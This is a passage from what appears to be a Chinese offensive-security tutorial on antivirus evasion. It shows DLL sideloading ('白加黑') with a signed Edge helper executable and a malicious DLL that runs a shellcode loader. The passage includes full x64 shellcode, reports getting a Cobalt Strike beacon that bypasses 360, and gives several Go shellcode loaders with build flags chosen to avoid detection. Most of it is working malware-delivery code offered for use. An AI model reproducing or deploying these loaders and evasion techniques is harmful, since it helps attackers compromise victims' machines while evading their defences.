<h6 id="DLL调试"><a href="#DLL调试" class="headerlink" title="DLL调试"></a>DLL调试</h6><p>因为DLL文件不能直接运行，所以需要新建一个exe项目对其进行调试</p>
<p>右键【解决方案】 -&gt; 【添加】 -&gt; 【新建项目】</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526084917068.png" alt="image-20250526084917068"></p>
<p>选择新建”控制台应用”，新建后解决方案下就多出了刚刚新建的项目</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526085102466.png" alt="image-20250526085102466"></p>
<p>编写DLLTest.cpp</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HMODULE dll1 = <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;Dll1.dll&quot;</span>);  <span class="comment">//加载Dll1.dll</span></span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(*ptrSum)</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;  <span class="comment">//定义一个函数指针类型ptrSum，后续将Dll1.dll中sum函数的地址复制给它</span></span><br><span class="line">	ptrSum sum = (ptrSum)<span class="built_in">GetProcAddress</span>(dll1, <span class="string">&quot;sum&quot;</span>);  <span class="comment">//从dll1中获取名为&quot;sum&quot;的函数的地址，并将其赋值给sum函数指针</span></span><br><span class="line">	cout &lt;&lt; <span class="built_in">sum</span>(<span class="number">1</span>, <span class="number">2</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后右键【DLLTest】 -&gt; 【设置为启动项目】</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526090152072.png" alt="image-20250526090152072"></p>
<p>最后生成解决方案即可</p>
<p><strong><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526090309318.png" alt="image-20250526090309318"></strong></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526090351037.png" alt="image-20250526090351037"></p>
<p>成功运行</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526091148857.png" alt="image-20250526091148857"></p>
<p>此时进行DLL调试，打断点，需要注意的是，无论是修改代码或打断点后，都需要重新生成解决方案再进行调试</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526091515514.png" alt="image-20250526091515514"></p>
<p>然后点击【Windows本地调试器】进行本地调试</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526091547330.png" alt="image-20250526091547330"></p>
<p>按【F5】退出调试。</p>
<h5 id="白加黑制作上线CS"><a href="#白加黑制作上线CS" class="headerlink" title="白加黑制作上线CS"></a>白加黑制作上线CS</h5><h6 id="SkyShadow工具"><a href="#SkyShadow工具" class="headerlink" title="SkyShadow工具"></a>SkyShadow工具</h6><p>首先将SkyShadow-main\Tools添加至环境变量</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526092711749.png" alt="image-20250526092711749"></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> SkyShadow.<span class="keyword">py</span> <span class="string">&quot;目标文件加路径&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526092837175.png" alt="image-20250526092837175"></p>
<p>会生成一个Payload目录，其中标有数字签名的可能是我们需要的白程序</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526093142551.png" alt="image-20250526093142551"></p>
<p>尝试运行 identity_helper.exe，发现提示缺少 msedge_elf.dll，无法正常运行</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526093510583.png" alt="image-20250526093510583"></p>
<p>再看生成的.txt文件，标注了缺少的dll和需要的具体函数，按照缺少的东西制作黑DLL即可</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526093810875.png" alt="image-20250526093810875"></p>
<h6 id="制作黑DLL上线CS"><a href="#制作黑DLL上线CS" class="headerlink" title="制作黑DLL上线CS"></a>制作黑DLL上线CS</h6><p>直接将导出函数放在dllmain.cpp中即可，直接把txt中写好的导出函数复制过去即可</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526094605855.png" alt="image-20250526094605855"></p>
<p>【生成解决方案】后，将dll文件放至目标exe目录下，运行exe，可以看到两个函数都被调用了</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526095046198.png" alt="image-20250526095046198"></p>
<p>GetInstallDetailsPayload() 被调用</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526095132259.png" alt="image-20250526095132259"></p>
<p>SignalInitializeCrashReporting() 被调用</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526095146224.png" alt="image-20250526095146224"></p>
<p>所以在两个函数中的任意一个写shellcode加载器即可，现尝试弹计算器的shellcode</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">GetInstallDetailsPayload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1、申请内存</span></span><br><span class="line">    LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2、拷贝 shellcode 到内存</span></span><br><span class="line">    <span class="built_in">memcpy</span>(addr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3、执行内存中的shellcode</span></span><br><span class="line">    <span class="comment">//创建线程执行</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//等待线程运行</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">    <span class="comment">//关闭线程</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">SignalInitializeCrashReporting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;SignalInitializeCrashReporting&quot;</span>, <span class="number">0</span>, <span class="number">0</span>); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行exe，直接弹出计算器</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526100259095.png" alt="image-20250526100259095"></p>
<p>将shellcode替换为sgn加密过的上线CS的shellcode，成功上线CS</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526102136207.png" alt="image-20250526102136207"></p>
<p>360查杀过了</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526103257991.png" alt="image-20250526103257991"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250526103349389.png" alt="image-20250526103349389"></p>
<h5 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h5><h6 id="DLL劫持与DLL代理"><a href="#DLL劫持与DLL代理" class="headerlink" title="DLL劫持与DLL代理"></a>DLL劫持与DLL代理</h6><p>**DLL劫持：**一个程序在启动时会加载某个DLL文件，攻击者将那个DLL文件替换为黑DLL，在导出函数中写入shellcode加载器，当受害者运行程序，加载黑DLL文件时便执行shellcode加载代码，攻击者CS上线。</p>
<p>**DLL代理：**程序要调用xxx.dll，攻击者创建了一个黑dll，名字也叫做xxx.dll，这个黑dll文件会接受程序的调用，先执行一些恶意代码，然后这个黑dll再调用真正的xxx.dll完成原视操作。</p>
<h6 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h6><p>郑神自研工具：<a target="_blank" rel="noopener" href="https://github.com/l1uyi/autoDllProxy">https://github.com/l1uyi/autoDllProxy</a></p>
<h3 id="Go语言免杀"><a href="#Go语言免杀" class="headerlink" title="Go语言免杀"></a>Go语言免杀</h3><h5 id="Go调用Windows-api"><a href="#Go调用Windows-api" class="headerlink" title="Go调用Windows api"></a>Go调用Windows api</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//1、MustLoadDLL方法 -&gt; 加载Kernel32.dll</span></span><br><span class="line">	kernel32 := syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、MustFindProc -&gt; 获取Windows api地址</span></span><br><span class="line">	VirtualAlloc := kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	RtlMoveMemory := kernel32.MustFindProc(<span class="string">&quot;RtlMoveMemory&quot;</span>)</span><br><span class="line">	CreateThread := kernel32.MustFindProc(<span class="string">&quot;CreateThread&quot;</span>)</span><br><span class="line">	WaitForSingleObject := kernel32.MustFindProc(<span class="string">&quot;WaitForSingleObject&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//弹计算器shellcode</span></span><br><span class="line">	buf := []<span class="type">byte</span>&#123;<span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, ...&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3、申请内存，通过函数名.Call调用</span></span><br><span class="line">	addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(buf)), <span class="number">0x1000</span>|<span class="number">0x2000</span>, <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4、复制buf到申请的内存中</span></span><br><span class="line">	RtlMoveMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;buf[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(buf)))</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5、创建线程</span></span><br><span class="line">	thread, _, _ := CreateThread.Call(<span class="number">0</span>, <span class="number">0</span>, addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//6、等待线程创建</span></span><br><span class="line">	WaitForSingleObject.Call(thread, <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//关闭 kernel32.dll</span></span><br><span class="line">	kernel32.Release()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="uinptr"><a href="#uinptr" class="headerlink" title="uinptr"></a>uinptr</h6><p>uinptr不是指针，而是一个可以”装下指针地址的整数”，是为了和操作系统底层操作而设计的。</p>
<h6 id="为什么返回3个参数"><a href="#为什么返回3个参数" class="headerlink" title="为什么返回3个参数"></a>为什么返回3个参数</h6><p>Call方法如下所示：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Proc)</span></span> Call(a ...<span class="type">uintptr</span>) (<span class="type">uintptr</span>, <span class="type">uintptr</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> SyscallN(p.Addr(), a...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回三个参数，第一个返回参数p.Addr()为Windows api地址</p>
<h5 id="Go编写shellcode加载器"><a href="#Go编写shellcode加载器" class="headerlink" title="Go编写shellcode加载器"></a>Go编写shellcode加载器</h5><h6 id="Go语言编译"><a href="#Go语言编译" class="headerlink" title="Go语言编译"></a>Go语言编译</h6><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> build main.<span class="keyword">go</span> -<span class="keyword">o</span> <span class="built_in">exp</span>.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure>

<p>-o：指定输出文件名</p>
<p><strong>减少体积编译(推荐使用)</strong></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> build -ldflags=<span class="string">&quot;-w -s&quot;</span> -<span class="keyword">o</span> shellcode.<span class="keyword">exe</span> main.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>

<p>-w：禁用调试信息生成</p>
<p>-s：禁用符号表</p>
<p><strong>隐藏CMD黑窗口(360会误杀)</strong></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> build -ldflags=<span class="string">&quot;-w -s -H windowsgui&quot;</span> -<span class="keyword">o</span> shellcode.<span class="keyword">exe</span> main.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>

<p>-H windowgui：隐藏CMD黑窗口</p>
<p><strong>隐藏源码路径信息</strong></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> build -<span class="keyword">o</span> shellcode.<span class="keyword">exe</span> -ldflags=<span class="string">&quot;-w -s&quot;</span> -trimpath main.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>

<p>Go编译一个程序时，会把编译器生成的源码路径，如 &#x2F;home&#x2F;user&#x2F;project&#x2F;main.go浅入到可执行文件中。</p>
<p>当反编译xxx.exe时，就会看到&#x2F;home&#x2F;user&#x2F;免杀项目&#x2F;main.go，可能会导致<strong>信息泄露，特征命中</strong></p>
<p>-trimpath：隐藏源码路径信息</p>
<h6 id="创建线程执行"><a href="#创建线程执行" class="headerlink" title="创建线程执行"></a>创建线程执行</h6><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//1、MustLoadDLL方法 -&gt; 加载Kernel32.dll</span></span><br><span class="line">	kernel32 := syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、MustFindProc -&gt; 获取Windows api</span></span><br><span class="line">	VirtualAlloc := kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	RtlMoveMemory := kernel32.MustFindProc(<span class="string">&quot;RtlMoveMemory&quot;</span>)</span><br><span class="line">	CreateThread := kernel32.MustFindProc(<span class="string">&quot;CreateThread&quot;</span>)</span><br><span class="line">	WaitForSingleObject := kernel32.MustFindProc(<span class="string">&quot;WaitForSingleObject&quot;</span>)</span><br><span class="line"></span><br><span class="line">	buf := []<span class="type">byte</span>&#123;<span class="number">0xe8</span>, <span class="number">0xa0</span>, <span class="number">0x03</span>, ...&#125;</span><br><span class="line">	<span class="comment">//3、申请内存，通过函数名.Call调用</span></span><br><span class="line">	addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(buf)), <span class="number">0x1000</span>|<span class="number">0x2000</span>, <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4、复制buf到申请的内存中</span></span><br><span class="line">	RtlMoveMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;buf[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(buf)))</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5、创建线程</span></span><br><span class="line">	thread, _, _ := CreateThread.Call(<span class="number">0</span>, <span class="number">0</span>, addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//6、等待线程创建</span></span><br><span class="line">	WaitForSingleObject.Call(thread, <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//关闭 kernel32.dll</span></span><br><span class="line">	kernel32.Release()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="回调函数运行-1"><a href="#回调函数运行-1" class="headerlink" title="回调函数运行"></a>回调函数运行</h6><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//1、MustLoadDLL方法 -&gt; 加载Kernel32.dll</span></span><br><span class="line">	kernel32 := syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、MustFindProc -&gt; 获取Windows api</span></span><br><span class="line">	VirtualAlloc := kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	RtlMoveMemory := kernel32.MustFindProc(<span class="string">&quot;RtlMoveMemory&quot;</span>)</span><br><span class="line">	CreateThread := kernel32.MustFindProc(<span class="string">&quot;CreateThread&quot;</span>)</span><br><span class="line">	WaitForSingleObject := kernel32.MustFindProc(<span class="string">&quot;WaitForSingleObject&quot;</span>)</span><br><span class="line"></span><br><span class="line">	buf := []<span class="type">byte</span>&#123;<span class="number">0xe8</span>, <span class="number">0xa0</span>, <span class="number">0x03</span>, ...&#125;</span><br><span class="line">	<span class="comment">//3、申请内存，通过函数名.Call调用</span></span><br><span class="line">	addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(buf)), <span class="number">0x1000</span>|<span class="number">0x2000</span>, <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4、复制buf到申请的内存中</span></span><br><span class="line">	RtlMoveMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;buf[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(buf)))</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5、回调函数运行</span></span><br><span class="line">	EnumDateFormatsA.Call(addr, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	kernel32.Release()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="本地分离-1"><a href="#本地分离-1" class="headerlink" title="本地分离"></a>本地分离</h6><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	byteSlice, err := os.ReadFile(<span class="string">&quot;pd_x64.ini&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;config file is not exist&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	kernel32 := syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	RtlCopyMemory := kernel32.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">	VirtualAlloc := kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(byteSlice)), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">	RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;byteSlice[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(byteSlice)))</span><br><span class="line"></span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong></p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;github.com/spf13/cobra&quot;</span></span><br></pre></td></tr></table></figure>

<p>已经成为了默认查杀点，所以需要去掉</p>
<h5 id="关闭黑窗口"><a href="#关闭黑窗口" class="headerlink" title="关闭黑窗口"></a>关闭黑窗口</h5><p><strong>编译参数消除黑框</strong></p>
